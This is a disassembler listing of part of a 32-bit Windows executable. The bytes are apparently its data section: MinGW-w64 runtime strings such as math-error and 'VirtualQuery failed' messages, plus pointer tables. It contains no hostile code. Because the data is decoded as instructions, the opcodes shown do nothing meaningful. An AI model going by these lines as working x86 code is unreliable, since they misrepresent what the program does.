  40d8fe:	outs   dx,DWORD PTR ds:[esi]
  40d8ff:	add    BYTE PTR [eax+eax*1+0x41],cl
  40d903:	add    BYTE PTR [esi+0x0],cl
  40d906:	pop    esp
  40d907:	add    BYTE PTR [esi+0x0],dl
  40d90a:	dec    esp
  40d90b:	add    BYTE PTR [ebx+0x0],al
  40d90e:	pop    esp
  40d90f:	add    BYTE PTR [eax],al
  40d911:	add    BYTE PTR [eax+eax*1+0x61],cl
  40d915:	add    BYTE PTR [esi+0x0],ch
  40d918:	add    BYTE PTR [bx+si],al
  40d91b:	add    BYTE PTR [ecx+0x75],ah
  40d91e:	je     0x40d98f
  40d920:	add    BYTE PTR [esi+0x6c],dh
  40d923:	arpl   WORD PTR [eax],ax
  40d925:	xor    ch,BYTE PTR [esi]
  40d927:	xor    ch,BYTE PTR [esi]
  40d929:	add    BYTE PTR ss:[edi+0x72],ch
  40d92d:	addr16 cs push esi
  40d930:	imul   esp,DWORD PTR [ebp+eiz*2+0x6f],0x2e4e414c
  40d938:	push   esi
  40d939:	dec    esp
  40d93a:	inc    ebx
  40d93b:	add    BYTE PTR [esi+0x4c],dl
  40d93e:	inc    ebx
  40d93f:	das    
  40d940:	xor    ch,BYTE PTR [esi]
  40d942:	xor    ch,BYTE PTR [esi]
  40d944:	add    BYTE PTR ss:[esi+0x4c],dl
  40d948:	inc    ebx
  40d949:	and    BYTE PTR [ebp+0x65],ch
  40d94c:	imul   esp,DWORD PTR fs:[ecx+0x20],0x79616c70
  40d954:	gs jb  0x40d957
  40d957:	push   0x656b746f
  40d95c:	jns    0x40d9d1
  40d95e:	sub    al,0x6e
  40d960:	outs   dx,DWORD PTR ds:[esi]
  40d961:	outs   dx,BYTE PTR ds:[esi]
  40d962:	add    BYTE PTR gs:[edi+0x6c],ah
  40d966:	outs   dx,DWORD PTR ds:[esi]
  40d967:	bound  esp,QWORD PTR [ecx+0x6c]
  40d96a:	push   0x656b746f
  40d96f:	jns    0x40d9e4
  40d971:	sub    al,0x6e
  40d973:	outs   dx,DWORD PTR ds:[esi]
  40d974:	outs   dx,BYTE PTR ds:[esi]
  40d975:	add    BYTE PTR gs:[eax],al
  40d978:	push   esi
  40d979:	add    BYTE PTR [eax+eax*1+0x43],cl
  40d97d:	add    BYTE PTR [eax],ah
  40d97f:	add    BYTE PTR [ebp+0x0],ch
  40d982:	add    BYTE PTR gs:[eax+eax*1+0x69],ah
  40d987:	add    BYTE PTR [ecx+0x0],ah
  40d98a:	and    BYTE PTR [eax],al
  40d98c:	jo     0x40d98e
  40d98e:	ins    BYTE PTR es:[edi],dx
  40d98f:	add    BYTE PTR [ecx+0x0],ah
  40d992:	jns    0x40d994
  40d994:	add    BYTE PTR gs:[edx+0x0],dh
  40d998:	add    BYTE PTR [eax],al
  40d99a:	add    BYTE PTR [eax],al
  40d99c:	push   esi
  40d99d:	add    BYTE PTR [eax+eax*1+0x43],cl
  40d9a1:	add    BYTE PTR [eax],ah
  40d9a3:	add    BYTE PTR [ebp+0x0],ch
  40d9a6:	add    BYTE PTR gs:[eax+eax*1+0x69],ah
  40d9ab:	add    BYTE PTR [ecx+0x0],ah
  40d9ae:	and    BYTE PTR [eax],al
  40d9b0:	jo     0x40d9b2
  40d9b2:	ins    BYTE PTR es:[edi],dx
  40d9b3:	add    BYTE PTR [ecx+0x0],ah
  40d9b6:	jns    0x40d9b8
  40d9b8:	add    BYTE PTR gs:[edx+0x0],dh
  40d9bc:	and    BYTE PTR [eax],al
  40d9be:	arpl   WORD PTR [eax],ax
  40d9c0:	outs   dx,DWORD PTR ds:[esi]
  40d9c1:	add    BYTE PTR [ebp+0x0],dh
  40d9c4:	ins    BYTE PTR es:[edi],dx
  40d9c5:	add    BYTE PTR [eax+eax*1+0x20],ah
  40d9c9:	add    BYTE PTR [esi+0x0],ch
  40d9cc:	outs   dx,DWORD PTR ds:[esi]
  40d9cd:	add    BYTE PTR [eax+eax*1+0x20],dh
  40d9d1:	add    BYTE PTR [ebx+0x0],dh
  40d9d4:	je     0x40d9d6
  40d9d6:	popa   
  40d9d7:	add    BYTE PTR [edx+0x0],dh
  40d9da:	je     0x40d9dc
  40d9dc:	add    BYTE PTR cs:[edx],cl
  40d9df:	add    BYTE PTR [ebp+0x0],al
  40d9e2:	imul   eax,DWORD PTR [eax],0x680074
  40d9e8:	add    BYTE PTR gs:[edx+0x0],dh
  40d9ec:	and    BYTE PTR [eax],al
  40d9ee:	je     0x40d9f0
  40d9f0:	push   0x20006500
  40d9f5:	add    BYTE PTR [ebx+0x0],ah
  40d9f8:	outs   dx,DWORD PTR ds:[esi]
  40d9f9:	add    BYTE PTR [ebp+0x0],ch
  40d9fc:	ins    DWORD PTR es:[edi],dx
  40d9fd:	add    BYTE PTR [ecx+0x0],ah
  40da00:	outs   dx,BYTE PTR ds:[esi]
  40da01:	add    BYTE PTR [eax+eax*1+0x20],ah
  40da05:	add    BYTE PTR [eax+eax*1+0x69],ch
  40da09:	add    BYTE PTR [esi+0x0],ch
  40da0c:	add    BYTE PTR gs:[eax],ah
  40da0f:	add    BYTE PTR [edi+0x0],ch
  40da12:	jo     0x40da14
  40da14:	je     0x40da16
  40da16:	imul   eax,DWORD PTR [eax],0x6e006f
  40da1c:	jae    0x40da1e
  40da1e:	and    BYTE PTR [eax],al
  40da20:	ja     0x40da22
  40da22:	add    BYTE PTR gs:[edx+0x0],dh
  40da26:	add    BYTE PTR gs:[eax],ah
  40da29:	add    BYTE PTR [ecx+0x0],ch
  40da2c:	outs   dx,BYTE PTR ds:[esi]
  40da2d:	add    BYTE PTR [esi+0x0],dh
  40da30:	popa   
  40da31:	add    BYTE PTR [eax+eax*1+0x69],ch
  40da35:	add    BYTE PTR [eax+eax*1+0x20],ah
  40da39:	add    BYTE PTR [edi+0x0],ch
  40da3c:	jb     0x40da3e
  40da3e:	and    BYTE PTR [eax],al
  40da40:	outs   dx,BYTE PTR ds:[esi]
  40da41:	add    BYTE PTR [edi+0x0],ch
  40da44:	and    BYTE PTR [eax],al
  40da46:	jo     0x40da48
  40da48:	ins    BYTE PTR es:[edi],dx
  40da49:	add    BYTE PTR [ebp+0x0],dh
  40da4c:	add    BYTE PTR [bx+di+0x0],ch
  40da50:	outs   dx,BYTE PTR ds:[esi]
  40da51:	add    BYTE PTR [ebx+0x0],dh
  40da54:	and    BYTE PTR [eax],al
  40da56:	ja     0x40da58
  40da58:	add    BYTE PTR gs:[edx+0x0],dh
  40da5c:	add    BYTE PTR gs:[eax],ah
  40da5f:	add    BYTE PTR [esi+0x0],ah
  40da62:	outs   dx,DWORD PTR ds:[esi]
  40da63:	add    BYTE PTR [ebp+0x0],dh
  40da66:	outs   dx,BYTE PTR ds:[esi]
  40da67:	add    BYTE PTR [eax+eax*1+0x2e],ah
  40da6b:	add    BYTE PTR [edx],cl
  40da6d:	add    BYTE PTR [eax],al
  40da6f:	add    al,al
  40da71:	cmc    
  40da72:	inc    eax
  40da73:	add    al,al
  40da75:	repnz inc eax
  40da77:	add    BYTE PTR [eax+0x5500402b],al
  40da7d:	outs   dx,BYTE PTR ds:[esi]
  40da7e:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  40da82:	outs   dx,BYTE PTR ds:[esi]
  40da83:	and    BYTE PTR [ebp+0x72],ah
  40da86:	jb     0x40daf7
  40da88:	jb     0x40da8a
  40da8a:	add    BYTE PTR [eax],al
  40da8c:	pop    edi
  40da8d:	ins    DWORD PTR es:[edi],dx
  40da8e:	popa   
  40da8f:	je     0x40daf9
  40da91:	gs jb  0x40db06
  40da94:	sub    BYTE PTR [ecx],ch
  40da96:	cmp    ah,BYTE PTR [eax]
  40da98:	and    eax,0x6e692073
  40da9d:	and    BYTE PTR ds:0x67252873,ah
  40daa3:	sub    al,0x20
  40daa5:	and    eax,0x20202967
  40daaa:	sub    BYTE PTR [edx+0x65],dh
  40daad:	je     0x40db25
  40daaf:	popa   
  40dab0:	ins    BYTE PTR es:[edi],dx
  40dab1:	cmp    eax,0xa296725
  40dab6:	add    BYTE PTR [eax],al
  40dab8:	inc    ecx
  40dab9:	jb     0x40db22
  40dabb:	jne    0x40db2a
  40dabd:	outs   dx,BYTE PTR gs:[esi]
  40dabf:	je     0x40dae1
  40dac1:	outs   dx,DWORD PTR fs:[esi]
  40dac3:	ins    DWORD PTR es:[edi],dx
  40dac4:	popa   
  40dac5:	imul   ebp,DWORD PTR [esi+0x20],0x6f727265
  40dacc:	jb     0x40daee
  40dace:	sub    BYTE PTR [edi+ecx*2+0x4d],al
  40dad2:	inc    ecx
  40dad3:	dec    ecx
  40dad4:	dec    esi
  40dad5:	sub    DWORD PTR [eax],eax
  40dad7:	inc    ecx
  40dad8:	jb     0x40db41
  40dada:	jne    0x40db49
  40dadc:	outs   dx,BYTE PTR gs:[esi]
  40dade:	je     0x40db00
  40dae0:	jae    0x40db4b
  40dae2:	outs   dx,BYTE PTR ds:[esi]
  40dae3:	addr16 jne 0x40db52
  40dae6:	popa   
  40dae7:	jb     0x40db52
  40dae9:	je     0x40db64
  40daeb:	and    BYTE PTR [eax],ch
  40daed:	push   ebx
  40daee:	dec    ecx
  40daef:	inc    edi
  40daf0:	dec    esi
  40daf1:	sub    DWORD PTR [eax],eax
  40daf3:	add    BYTE PTR [edi+0x76],cl
  40daf6:	gs jb  0x40db5f
  40daf9:	ins    BYTE PTR es:[edi],dx
  40dafa:	outs   dx,DWORD PTR ds:[esi]
  40dafb:	ja     0x40db1d
  40dafd:	jb     0x40db60
  40daff:	outs   dx,BYTE PTR ds:[esi]
  40db00:	and    BYTE PTR gs:[di+0x72],ah
  40db05:	jb     0x40db76
  40db07:	jb     0x40db29
  40db09:	sub    BYTE PTR [edi+0x56],cl
  40db0c:	inc    ebp
  40db0d:	push   edx
  40db0e:	inc    esi
  40db0f:	dec    esp
  40db10:	dec    edi
  40db11:	push   edi
  40db12:	sub    DWORD PTR [eax],eax
  40db14:	push   esp
  40db15:	push   0x65722065
  40db1a:	jae    0x40db91
  40db1c:	ins    BYTE PTR es:[edi],dx
  40db1d:	je     0x40db3f
  40db1f:	imul   esi,DWORD PTR [ebx+0x20],0x206f6f74
  40db26:	jae    0x40db95
  40db28:	popa   
  40db29:	ins    BYTE PTR es:[edi],dx
  40db2a:	ins    BYTE PTR es:[edi],dx
  40db2b:	and    BYTE PTR [edi+ebp*2+0x20],dh
  40db2f:	bound  esp,QWORD PTR [ebp+0x20]
  40db32:	jb     0x40db99
  40db34:	jo     0x40dba8
  40db36:	gs jae 0x40db9e
  40db39:	outs   dx,BYTE PTR ds:[esi]
  40db3a:	je     0x40dba1
  40db3c:	and    BYTE PTR fs:[eax],ch
  40db3f:	push   ebp
  40db40:	dec    esi
  40db41:	inc    esp
  40db42:	inc    ebp
  40db43:	push   edx
  40db44:	inc    esi
  40db45:	dec    esp
  40db46:	dec    edi
  40db47:	push   edi
  40db48:	sub    DWORD PTR [eax],eax
  40db4a:	add    BYTE PTR [eax],al
  40db4c:	push   esp
  40db4d:	outs   dx,DWORD PTR ds:[esi]
  40db4e:	je     0x40dbb1
  40db50:	ins    BYTE PTR es:[edi],dx
  40db51:	and    BYTE PTR [edi+ebp*2+0x73],ch
  40db55:	jae    0x40db77
  40db57:	outs   dx,DWORD PTR ds:[esi]
  40db58:	data16 and BYTE PTR [ebx+0x69],dh
  40db5c:	outs   dx,BYTE PTR ds:[si]
  40db5e:	imul   esp,DWORD PTR [esi+0x69],0x636e6163
  40db65:	and    BYTE PTR gs:[eax],ch
  40db68:	push   esp
  40db69:	dec    esp
  40db6a:	dec    edi
  40db6b:	push   ebx
  40db6c:	push   ebx
  40db6d:	sub    DWORD PTR [eax],eax
  40db6f:	add    BYTE PTR [eax+0x61],dl
  40db72:	jb     0x40dbe8
  40db74:	imul   esp,DWORD PTR [ecx+0x6c],0x736f6c20
  40db7b:	jae    0x40db9d
  40db7d:	outs   dx,DWORD PTR ds:[esi]
  40db7e:	data16 and BYTE PTR [ebx+0x69],dh
  40db82:	outs   dx,BYTE PTR ds:[si]
  40db84:	imul   esp,DWORD PTR [esi+0x69],0x636e6163
  40db8b:	and    BYTE PTR gs:[eax],ch
  40db8e:	push   eax
  40db8f:	dec    esp
  40db90:	dec    edi
  40db91:	push   ebx
  40db92:	push   ebx
  40db93:	sub    DWORD PTR [eax],eax
  40db95:	add    BYTE PTR [eax],al
  40db97:	add    BYTE PTR [eax-0x28ffbf26],bh
  40db9d:	fiadd  DWORD PTR [eax+0x0]
  40dba0:	hlt    
  40dba1:	fiadd  DWORD PTR [eax+0x0]
  40dba4:	adc    al,0xdb
  40dba6:	inc    eax
  40dba7:	add    BYTE PTR [ebx+ebx*8+0x40],cl
  40dbab:	add    BYTE PTR [eax-0x25],dh
  40dbae:	inc    eax
  40dbaf:	add    BYTE PTR [ebp+0x69],cl
  40dbb2:	outs   dx,BYTE PTR ds:[esi]
  40dbb3:	addr16 ja 0x40dbe3
  40dbb6:	ja     0x40dbee
  40dbb8:	xor    al,0x20
  40dbba:	jb     0x40dc31
  40dbbc:	outs   dx,BYTE PTR ds:[esi]
  40dbbd:	je     0x40dc28
  40dbbf:	ins    DWORD PTR es:[edi],dx
  40dbc0:	and    BYTE PTR gs:[esi+0x61],ah
  40dbc4:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0xa3a65
  40dbcc:	inc    ecx
  40dbcd:	fs fs jb 0x40dc36
  40dbd1:	jae    0x40dc46
  40dbd3:	and    BYTE PTR ds:0x61682070,ah
  40dbd9:	jae    0x40dbfb
  40dbdb:	outs   dx,BYTE PTR ds:[esi]
  40dbdc:	outs   dx,DWORD PTR ds:[esi]
  40dbdd:	and    BYTE PTR [ecx+0x6d],ch
  40dbe0:	popa   
  40dbe1:	addr16 gs sub eax,0x74636573
  40dbe8:	imul   ebp,DWORD PTR [edi+0x6e],0x56202000
  40dbef:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  40dbf6:	jne    0x40dc5d
  40dbf8:	jb     0x40dc73
  40dbfa:	and    BYTE PTR [esi+0x61],ah
  40dbfd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x726f6620
  40dc05:	and    BYTE PTR ds:0x79622064,ah
  40dc0b:	je     0x40dc72
  40dc0d:	jae    0x40dc2f
  40dc0f:	popa   
  40dc10:	je     0x40dc32
  40dc12:	popa   
  40dc13:	fs fs jb 0x40dc7c
  40dc17:	jae    0x40dc8c
  40dc19:	and    BYTE PTR ds:0x70,ah
  40dc1f:	add    BYTE PTR [eax],ah
  40dc21:	and    BYTE PTR [esi+0x69],dl
  40dc24:	jb     0x40dc9a
  40dc26:	jne    0x40dc89
  40dc28:	ins    BYTE PTR es:[edi],dx
  40dc29:	push   eax
  40dc2a:	jb     0x40dc9b
  40dc2c:	je     0x40dc93
  40dc2e:	arpl   WORD PTR [eax+eiz*1+0x66],si
  40dc32:	popa   
  40dc33:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x74697720
  40dc3b:	push   0x646f6320
  40dc40:	and    BYTE PTR gs:[eax],dh
  40dc43:	js     0x40dc6a
  40dc45:	js     0x40dc47
  40dc47:	add    BYTE PTR [eax],ah
  40dc49:	and    BYTE PTR [ebp+0x6e],dl
  40dc4c:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  40dc50:	outs   dx,BYTE PTR ds:[esi]
  40dc51:	and    BYTE PTR [eax+0x73],dh
  40dc54:	gs jne 0x40dcbb
  40dc57:	outs   dx,DWORD PTR ds:[esi]
  40dc58:	and    BYTE PTR [edx+0x65],dh
  40dc5b:	ins    BYTE PTR es:[edi],dx
  40dc5c:	outs   dx,DWORD PTR ds:[esi]
  40dc5d:	arpl   WORD PTR [ecx+0x74],sp
  40dc60:	imul   ebp,DWORD PTR [edi+0x6e],0x6f727020
  40dc67:	je     0x40dcd8
  40dc69:	arpl   WORD PTR [edi+0x6c],bp
  40dc6c:	and    BYTE PTR [esi+0x65],dh
  40dc6f:	jb     0x40dce4
  40dc71:	imul   ebp,DWORD PTR [edi+0x6e],0x2e642520
  40dc78:	or     al,BYTE PTR [eax]
  40dc7a:	add    BYTE PTR [eax],al
  40dc7c:	and    BYTE PTR [eax],ah
  40dc7e:	push   ebp
  40dc7f:	outs   dx,BYTE PTR ds:[esi]
  40dc80:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  40dc84:	outs   dx,BYTE PTR ds:[esi]
  40dc85:	and    BYTE PTR [eax+0x73],dh
  40dc88:	gs jne 0x40dcef
  40dc8b:	outs   dx,DWORD PTR ds:[esi]
  40dc8c:	and    BYTE PTR [edx+0x65],dh
  40dc8f:	ins    BYTE PTR es:[edi],dx
  40dc90:	outs   dx,DWORD PTR ds:[esi]
  40dc91:	arpl   WORD PTR [ecx+0x74],sp
  40dc94:	imul   ebp,DWORD PTR [edi+0x6e],0x74696220
  40dc9b:	and    BYTE PTR [ebx+0x69],dh
  40dc9e:	jp     0x40dd05
  40dca0:	and    BYTE PTR ds:0xa2e64,ah
  40dca6:	add    BYTE PTR [eax],al
  40dca8:	dec    esi
  40dca9:	popa   
  40dcaa:	dec    esi
  40dcab:	add    BYTE PTR [ecx+0x6e],cl
  40dcae:	data16 add BYTE PTR [eax],ch
  40dcb1:	add    BYTE PTR [esi+0x0],ch
  40dcb4:	jne    0x40dcb6
  40dcb6:	ins    BYTE PTR es:[edi],dx
  40dcb7:	add    BYTE PTR [eax+eax*1+0x29],ch
  40dcbb:	add    BYTE PTR [eax],al
  40dcbd:	add    BYTE PTR [eax],ch
  40dcbf:	outs   dx,BYTE PTR ds:[esi]
  40dcc0:	jne    0x40dd2e
  40dcc2:	ins    BYTE PTR es:[edi],dx
  40dcc3:	sub    DWORD PTR [eax],eax
  40dcc5:	push   eax
  40dcc6:	push   edx
  40dcc7:	dec    ecx
  40dcc8:	dec    esi
  40dcc9:	push   esp
  40dcca:	inc    esi
  40dccb:	pop    edi
  40dccc:	inc    ebp
  40dccd:	pop    eax
  40dcce:	push   eax
  40dccf:	dec    edi
  40dcd0:	dec    esi
  40dcd1:	inc    ebp
  40dcd2:	dec    esi
  40dcd3:	push   esp
  40dcd4:	pop    edi
  40dcd5:	inc    esp
  40dcd6:	dec    ecx
  40dcd7:	inc    edi
  40dcd8:	dec    ecx
  40dcd9:	push   esp
  40dcda:	push   ebx
  40dcdb:	add    BYTE PTR [eax],dh
  40dcdd:	pop    edx
  40dcde:	inc    eax
  40dcdf:	add    al,al
  40dce1:	pop    edx
  40dce2:	inc    eax
  40dce3:	add    al,al
  40dce5:	pop    edx
  40dce6:	inc    eax
  40dce7:	add    BYTE PTR [eax],dl
  40dce9:	pop    edx
  40dcea:	inc    eax
  40dceb:	add    al,al
  40dced:	pop    edx
  40dcee:	inc    eax
  40dcef:	add    BYTE PTR [eax+0x5a],ah
  40dcf2:	inc    eax
  40dcf3:	add    al,al
  40dcf5:	pop    edx
  40dcf6:	inc    eax
  40dcf7:	add    BYTE PTR [edx+ebx*2+0x40],al
  40dcfb:	add    al,al
  40dcfd:	pop    edx
  40dcfe:	inc    eax
  40dcff:	add    al,al
  40dd01:	pop    edx
  40dd02:	inc    eax
  40dd03:	add    BYTE PTR [eax+0x5a],dh
  40dd06:	inc    eax
  40dd07:	add    al,dh
  40dd09:	pop    ecx
  40dd0a:	inc    eax
  40dd0b:	add    al,al
  40dd0d:	pop    edx
  40dd0e:	inc    eax
  40dd0f:	add    al,dl
  40dd11:	pop    ecx
  40dd12:	inc    eax
  40dd13:	add    BYTE PTR [eax-0x3fffbfa7],dh
  40dd19:	pop    edx
  40dd1a:	inc    eax
  40dd1b:	add    BYTE PTR [eax-0x3fffbfa7],dl
  40dd21:	pop    edx
  40dd22:	inc    eax
  40dd23:	add    al,al
  40dd25:	pop    edx
  40dd26:	inc    eax
  40dd27:	add    al,al
  40dd29:	pop    edx
  40dd2a:	inc    eax
  40dd2b:	add    al,al
  40dd2d:	pop    edx
  40dd2e:	inc    eax
  40dd2f:	add    al,al
  40dd31:	pop    edx
  40dd32:	inc    eax
  40dd33:	add    al,al
  40dd35:	pop    edx
  40dd36:	inc    eax
  40dd37:	add    al,al
  40dd39:	pop    edx
  40dd3a:	inc    eax
  40dd3b:	add    al,al
  40dd3d:	pop    edx
  40dd3e:	inc    eax
  40dd3f:	add    al,al
  40dd41:	pop    edx
  40dd42:	inc    eax
  40dd43:	add    al,al
  40dd45:	pop    edx
  40dd46:	inc    eax
  40dd47:	add    al,al
  40dd49:	pop    edx
  40dd4a:	inc    eax
  40dd4b:	add    al,al
  40dd4d:	pop    edx
  40dd4e:	inc    eax
  40dd4f:	add    al,al
  40dd51:	pop    edx
  40dd52:	inc    eax
  40dd53:	add    al,al
  40dd55:	pop    edx
  40dd56:	inc    eax
  40dd57:	add    al,al
  40dd59:	pop    edx
  40dd5a:	inc    eax
  40dd5b:	add    al,al
  40dd5d:	pop    edx
  40dd5e:	inc    eax
  40dd5f:	add    BYTE PTR [eax+0x59],ah
  40dd62:	inc    eax
  40dd63:	add    al,al
  40dd65:	pop    edx
  40dd66:	inc    eax
  40dd67:	add    BYTE PTR [eax],ah
  40dd69:	pop    ecx
  40dd6a:	inc    eax
  40dd6b:	add    al,al
  40dd6d:	pop    edx
  40dd6e:	inc    eax
  40dd6f:	add    al,dh
  40dd71:	pop    eax
  40dd72:	inc    eax
  40dd73:	add    al,al
  40dd75:	pop    eax
  40dd76:	inc    eax
  40dd77:	add    BYTE PTR [eax-0x3fffbfa8],dl
  40dd7d:	pop    edx
  40dd7e:	inc    eax
  40dd7f:	add    BYTE PTR [ebp+0x58],dl
  40dd82:	inc    eax
  40dd83:	add    al,al
  40dd85:	pop    edx
  40dd86:	inc    eax
  40dd87:	add    al,al
  40dd89:	pop    edx
  40dd8a:	inc    eax
  40dd8b:	add    BYTE PTR [eax+0x58],al
  40dd8e:	inc    eax
  40dd8f:	add    al,al
  40dd91:	pop    edx
  40dd92:	inc    eax
  40dd93:	add    al,al
  40dd95:	pop    edx
  40dd96:	inc    eax
  40dd97:	add    al,al
  40dd99:	pop    edx
  40dd9a:	inc    eax
  40dd9b:	add    al,al
  40dd9d:	pop    edx
  40dd9e:	inc    eax
  40dd9f:	add    al,al
  40dda1:	pop    edx
  40dda2:	inc    eax
  40dda3:	add    al,al
  40dda5:	pop    edx
  40dda6:	inc    eax
  40dda7:	add    BYTE PTR [edx],dl
  40dda9:	pop    ebx
  40ddaa:	inc    eax
  40ddab:	add    al,al
  40ddad:	pop    edx
  40ddae:	inc    eax
  40ddaf:	add    al,al
  40ddb1:	pop    edx
  40ddb2:	inc    eax
  40ddb3:	add    al,al
  40ddb5:	pop    edx
  40ddb6:	inc    eax
  40ddb7:	add    al,al
  40ddb9:	pop    edx
  40ddba:	inc    eax
  40ddbb:	add    al,dl
  40ddbd:	push   edi
  40ddbe:	inc    eax
  40ddbf:	add    al,al
  40ddc1:	pop    edx
  40ddc2:	inc    eax
  40ddc3:	add    al,al
  40ddc5:	pop    edx
  40ddc6:	inc    eax
  40ddc7:	add    al,al
  40ddc9:	pop    edx
  40ddca:	inc    eax
  40ddcb:	add    al,al
  40ddcd:	pop    edx
  40ddce:	inc    eax
  40ddcf:	add    al,al
  40ddd1:	pop    edx
  40ddd2:	inc    eax
  40ddd3:	add    al,al
  40ddd5:	pop    edx
  40ddd6:	inc    eax
  40ddd7:	add    al,al
  40ddd9:	pop    edx
  40ddda:	inc    eax
  40dddb:	add    al,al
  40dddd:	pop    edx
  40ddde:	inc    eax
  40dddf:	add    BYTE PTR [edi+edx*2+0x5ac00040],dl
  40dde6:	inc    eax
  40dde7:	add    BYTE PTR [eax+0x57],dl
  40ddea:	inc    eax
  40ddeb:	add    al,ah
  40dded:	push   esi
  40ddee:	inc    eax
  40ddef:	add    BYTE PTR [ecx+0x45004056],ah
  40ddf5:	push   esi
  40ddf6:	inc    eax
  40ddf7:	add    BYTE PTR [eax],dl
  40ddf9:	push   esi
  40ddfa:	inc    eax
  40ddfb:	add    BYTE PTR [eax-0x1fffbfaa],al
  40de01:	push   esi
  40de02:	inc    eax
  40de03:	add    cl,dh
  40de05:	push   ebp
  40de06:	inc    eax
  40de07:	add    al,al
  40de09:	pop    edx
  40de0a:	inc    eax
  40de0b:	add    al,dl
  40de0d:	push   ebp
  40de0e:	inc    eax
  40de0f:	add    BYTE PTR [ecx+0x50004055],ah
  40de15:	push   ebp
  40de16:	inc    eax
  40de17:	add    al,dl
  40de19:	push   edi
  40de1a:	inc    eax
  40de1b:	add    BYTE PTR [eax],al
  40de1d:	push   ebp
  40de1e:	inc    eax
  40de1f:	add    al,al
  40de21:	pop    edx
  40de22:	inc    eax
  40de23:	add    al,al
  40de25:	pop    edx
  40de26:	inc    eax
  40de27:	add    BYTE PTR [esp+edx*2+0x54600040],dh
  40de2e:	inc    eax
  40de2f:	add    al,dl
  40de31:	push   edi
  40de32:	inc    eax
  40de33:	add    al,al
  40de35:	pop    edx
  40de36:	inc    eax
  40de37:	add    al,al
  40de39:	pop    edx
  40de3a:	inc    eax
  40de3b:	add    al,dl
  40de3d:	push   edi
  40de3e:	inc    eax
  40de3f:	add    al,al
  40de41:	pop    edx
  40de42:	inc    eax
  40de43:	add    BYTE PTR [eax+0x54],ah
  40de46:	inc    eax
  40de47:	add    BYTE PTR [esi+0x61],cl
  40de4a:	dec    esi
  40de4b:	add    BYTE PTR [ecx+0x6e],cl
  40de4e:	data16 add BYTE PTR [eax],ch
  40de51:	add    BYTE PTR [esi+0x0],ch
  40de54:	jne    0x40de56
  40de56:	ins    BYTE PTR es:[edi],dx
  40de57:	add    BYTE PTR [eax+eax*1+0x29],ch
  40de5b:	add    BYTE PTR [eax],al
  40de5d:	add    BYTE PTR [eax],ch
  40de5f:	outs   dx,BYTE PTR ds:[esi]
  40de60:	jne    0x40dece
  40de62:	ins    BYTE PTR es:[edi],dx
  40de63:	sub    DWORD PTR [eax],eax
  40de65:	push   eax
  40de66:	push   edx
  40de67:	dec    ecx
  40de68:	dec    esi
  40de69:	push   esp
  40de6a:	inc    esi
  40de6b:	pop    edi
  40de6c:	inc    ebp
  40de6d:	pop    eax
  40de6e:	push   eax
  40de6f:	dec    edi
  40de70:	dec    esi
  40de71:	inc    ebp
  40de72:	dec    esi
  40de73:	push   esp
  40de74:	pop    edi
  40de75:	inc    esp
  40de76:	dec    ecx
  40de77:	inc    edi
  40de78:	dec    ecx
  40de79:	push   esp
  40de7a:	push   ebx
  40de7b:	add    BYTE PTR [eax+0x2000407d],dl
  40de81:	jle    0x40dec3
  40de83:	add    BYTE PTR [eax],ah
  40de85:	jle    0x40dec7
  40de87:	add    BYTE PTR [eax+0x7d],dh
  40de8a:	inc    eax
  40de8b:	add    BYTE PTR [eax],ah
  40de8d:	jle    0x40decf
  40de8f:	add    al,al
  40de91:	jge    0x40ded3
  40de93:	add    BYTE PTR [eax],ah
  40de95:	jle    0x40ded7
  40de97:	add    BYTE PTR [ebp+edi*2+0x7e200040],ah
  40de9e:	inc    eax
  40de9f:	add    BYTE PTR [eax],ah
  40dea1:	jle    0x40dee3
  40dea3:	add    al,dl
  40dea5:	jge    0x40dee7
  40dea7:	add    BYTE PTR [eax+0x7d],dl
  40deaa:	inc    eax
  40deab:	add    BYTE PTR [eax],ah
  40dead:	jle    0x40deef
  40deaf:	add    BYTE PTR [eax],dh
  40deb1:	jge    0x40def3
  40deb3:	add    BYTE PTR [eax],dl
  40deb5:	jge    0x40def7
  40deb7:	add    BYTE PTR [eax],ah
  40deb9:	jle    0x40defb
  40debb:	add    al,dh
  40debd:	jl     0x40deff
  40debf:	add    BYTE PTR [eax],ah
  40dec1:	jle    0x40df03
  40dec3:	add    BYTE PTR [eax],ah
  40dec5:	jle    0x40df07
  40dec7:	add    BYTE PTR [eax],ah
  40dec9:	jle    0x40df0b
  40decb:	add    BYTE PTR [eax],ah
  40decd:	jle    0x40df0f
  40decf:	add    BYTE PTR [eax],ah
  40ded1:	jle    0x40df13
  40ded3:	add    BYTE PTR [eax],ah
  40ded5:	jle    0x40df17
  40ded7:	add    BYTE PTR [eax],ah
  40ded9:	jle    0x40df1b
  40dedb:	add    BYTE PTR [eax],ah
  40dedd:	jle    0x40df1f
  40dedf:	add    BYTE PTR [eax],ah
  40dee1:	jle    0x40df23
  40dee3:	add    BYTE PTR [eax],ah
  40dee5:	jle    0x40df27
  40dee7:	add    BYTE PTR [eax],ah
  40dee9:	jle    0x40df2b
  40deeb:	add    BYTE PTR [eax],ah
  40deed:	jle    0x40df2f
  40deef:	add    BYTE PTR [eax],ah
  40def1:	jle    0x40df33
  40def3:	add    BYTE PTR [eax],ah
  40def5:	jle    0x40df37
  40def7:	add    BYTE PTR [eax],ah
  40def9:	jle    0x40df3b
  40defb:	add    BYTE PTR [eax],ah
  40defd:	jle    0x40df3f
  40deff:	add    al,al
  40df01:	jl     0x40df43
  40df03:	add    BYTE PTR [eax],ah
  40df05:	jle    0x40df47
  40df07:	add    BYTE PTR [eax+0x2000407c],al
  40df0d:	jle    0x40df4f
  40df0f:	add    BYTE PTR [eax+0x7c],dl
  40df12:	inc    eax
  40df13:	add    BYTE PTR [eax],ah
  40df15:	jl     0x40df57
  40df17:	add    cl,dh
  40df19:	jnp    0x40df5b
  40df1b:	add    BYTE PTR [eax],ah
  40df1d:	jle    0x40df5f
  40df1f:	add    BYTE PTR [ebp+0x2000407b],dh
  40df25:	jle    0x40df67
  40df27:	add    BYTE PTR [eax],ah
  40df29:	jle    0x40df6b
  40df2b:	add    BYTE PTR [eax+0x2000407b],ah
  40df31:	jle    0x40df73
  40df33:	add    BYTE PTR [eax],ah
  40df35:	jle    0x40df77
  40df37:	add    BYTE PTR [eax],ah
  40df39:	jle    0x40df7b
  40df3b:	add    BYTE PTR [eax],ah
